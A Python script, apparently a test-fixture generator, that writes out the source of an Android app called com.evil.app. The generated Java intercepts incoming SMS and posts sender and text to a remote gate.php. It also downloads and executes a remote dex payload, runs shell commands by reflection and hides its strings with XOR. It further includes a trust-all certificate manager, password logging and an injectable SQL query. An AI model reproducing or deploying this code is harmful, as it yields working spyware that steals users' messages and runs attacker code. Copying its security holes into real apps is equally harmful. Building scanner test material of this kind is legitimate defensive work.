"""Sinh source app test testapp."""
import os
os.makedirs("src/com/evil/app", exist_ok=True)
key="K3y!"
def enc(s): return "".join("\\%03o" % (ord(c)^ord(key[i%len(key)])) for i,c in enumerate(s))
E = {k: enc(v) for k,v in {"cmd":"id","url":"http://203.0.113.7/gate.php","pay":"/payload.dex","tag":"svc"}.items()}
src = {}
src["MainActivity"] = f'''package com.evil.app;
import android.app.Activity; import android.os.Bundle;
public class MainActivity extends Activity {{
    @Override protected void onCreate(Bundle b) {{
        super.onCreate(b);
        try {{ runCmd(); }} catch (Exception e) {{ }}
        new Thread(new Loader(this)).start();
    }}
    void runCmd() throws Exception {{
        Class<?> c = Class.forName("java.lang.Runtime");
        Object rt = c.getMethod("getRuntime").invoke(null);
        c.getMethod("exec", String.class).invoke(rt, S.d("{E['cmd']}"));
    }}
}}'''
src["S"] = '''package com.evil.app;
public class S {
    public static String d(String s) {
        char[] k = "K3y!".toCharArray();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < s.length(); i++) sb.append((char) (s.charAt(i) ^ k[i % k.length]));
        return sb.toString();
    }
}'''
src["Net"] = f'''package com.evil.app;
import java.net.*; import java.io.*;
public class Net {{
    public static void post(String data) {{
        try {{
            HttpURLConnection c = (HttpURLConnection) new URL(S.d("{E['url']}")).openConnection();
            c.setDoOutput(true); c.getOutputStream().write(data.getBytes());
        }} catch (Exception e) {{ }}
    }}
}}'''
src["SmsReceiver"] = f'''package com.evil.app;
import android.content.*; import android.telephony.SmsMessage; import android.os.Bundle;
public class SmsReceiver extends BroadcastReceiver {{
    @Override public void onReceive(Context ctx, Intent it) {{
        Object[] pdus = (Object[]) it.getExtras().get("pdus");
        for (Object p : pdus) {{
            SmsMessage m = SmsMessage.createFromPdu((byte[]) p);
            Net.post(m.getOriginatingAddress() + ":" + m.getMessageBody());
        }}
        android.util.Log.d(S.d("{E['tag']}"), "got sms");
    }}
}}'''
src["Loader"] = f'''package com.evil.app;
import android.content.Context; import java.net.*; import java.io.*; import dalvik.system.DexClassLoader;
public class Loader implements Runnable {{
    private final Context ctx; public Loader(Context c) {{ ctx = c; }}
    public void run() {{
        try {{
            InputStream in = new URL(S.d("{E['url']}") + S.d("{E['pay']}")).openConnection().getInputStream();
            File f = new File(ctx.getCacheDir(), "p.dex");
            FileOutputStream o = new FileOutputStream(f); byte[] b = new byte[4096]; int n;
            while ((n = in.read(b)) > 0) o.write(b, 0, n); o.close();
            DexClassLoader cl = new DexClassLoader(f.getPath(), ctx.getCacheDir().getPath(), null, ctx.getClassLoader());
            cl.loadClass("x.Main").getMethod("go").invoke(null);
        }} catch (Exception e) {{ }}
    }}
}}'''
src["TrustAll"] = '''package com.evil.app;
import javax.net.ssl.X509TrustManager; import java.security.cert.X509Certificate;
public class TrustAll implements X509TrustManager {
    public void checkClientTrusted(X509Certificate[] c, String a) { }
    public void checkServerTrusted(X509Certificate[] c, String a) { }
    public X509Certificate[] getAcceptedIssuers() { return null; }
}'''
src["Db"] = '''package com.evil.app;
import android.database.sqlite.SQLiteDatabase; import android.util.Log;
public class Db {
    public static void login(SQLiteDatabase db, String user, String pass) {
        Log.d("auth", "login password=" + pass);
        db.rawQuery("SELECT * FROM users WHERE name='" + user + "' AND pass='" + pass + "'", null);
    }
}'''
for n, c in src.items(): open(f"src/com/evil/app/{n}.java","w").write(c)
open("AndroidManifest.xml","w").write('''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.evil.app" android:versionName="1.0">
  <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="34"/>
  <uses-permission android:name="android.permission.RECEIVE_SMS"/>
  <uses-permission android:name="android.permission.INTERNET"/>
  <application android:label="Test" android:allowBackup="true" android:usesCleartextTraffic="true">
    <activity android:name=".MainActivity" android:exported="true">
      <intent-filter><action android:name="android.intent.action.MAIN"/><category android:name="android.intent.category.LAUNCHER"/></intent-filter>
    </activity>
    <receiver android:name=".SmsReceiver" android:exported="true">
      <intent-filter android:priority="999"><action android:name="android.provider.Telephony.SMS_RECEIVED"/></intent-filter>
    </receiver>
  </application>
</manifest>''')
